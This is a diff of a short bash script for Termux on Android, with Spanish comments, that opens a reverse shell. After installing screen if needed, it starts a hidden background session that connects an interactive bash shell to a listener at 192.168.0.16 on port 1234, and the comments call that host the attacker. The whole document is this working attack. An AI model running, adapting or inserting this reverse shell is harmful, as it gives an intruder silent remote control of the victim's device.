@@ -1,16 +1,21 @@
 #!$PREFIX/bash
+#ARRIBA INDICA DONDE ESTA BASH PARA QUE SE INTERPRETE
 
-#DIR="/data/data/com.termux/files/usr/bin/screen"
-DIR="$PREFIX/screen"
-ip="192.168.0.13"
+#VARIABLES
+DIR="$PREFIX/bin/screen"
+ip="192.168.0.16"
 port=1234
 
+#VERIFICA SI EXISTE DIR, SI NO EXISTE VA EN ELSE Y INSTALA screen
 if [ -d "$DIR" ]
 then
-
-	screen -AmdS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+	#EJECUTA screen para que el comando se ejecuta en el background, conectandose al atacante 
+	#en la ip y el puerto
+	screen -md bash -c 'bash -i >/dev/tcp/'$ip'/'$port' 2>&1 0<&1'
 else
+	#instala screen
 	apt install screen
 	clear
-	screen -AmdS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+	#hace lo mismo
+	screen -md bash -c 'bash -i >/dev/tcp/'$ip'/'$port' 2>&1 0<&1'
 fi
